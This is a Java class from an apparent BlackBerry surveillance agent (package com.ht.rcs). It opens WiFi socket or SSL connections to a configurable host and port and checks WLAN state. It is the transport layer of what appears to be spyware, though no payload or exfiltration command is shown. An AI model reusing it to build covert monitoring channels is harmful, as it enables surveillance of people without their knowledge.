package com.ht.rcs.blackberry.transfer;

import java.io.IOException;

import javax.microedition.io.Connector;
import javax.microedition.io.StreamConnection;

import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.WLANInfo;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class WifiConnection extends Connection {
    //#debug
    static Debug debug = new Debug("Wifi", DebugLevel.VERBOSE);

    private String host;
    private int port;
    private boolean ssl;

    private int timeout = 3 * 60 * 1000;

    // Constructor
    public WifiConnection(String host_, int port_, boolean ssl_) {
        this.host = host_;
        this.port = port_;
        this.ssl = ssl_;
        
        
        if (ssl) {
            url = "ssl://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout + ";deviceside=true;interface=wifi";
        } else {
            url = "socket://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout + ";deviceside=true;interface=wifi";
        }
    }

    protected void error(String string) {
        // #debug
        debug.error(string);
    }

    public synchronized boolean isActive() {
        boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
        boolean connected = WLANInfo.getWLANState() == WLANInfo.WLAN_STATE_CONNECTED;

        // #debug
        debug.info("Active: " + active + " Connected: " + connected);
        return connected && active;
    }

    protected void trace(String string) {
        // #debug
        debug.trace(string);
    }

}
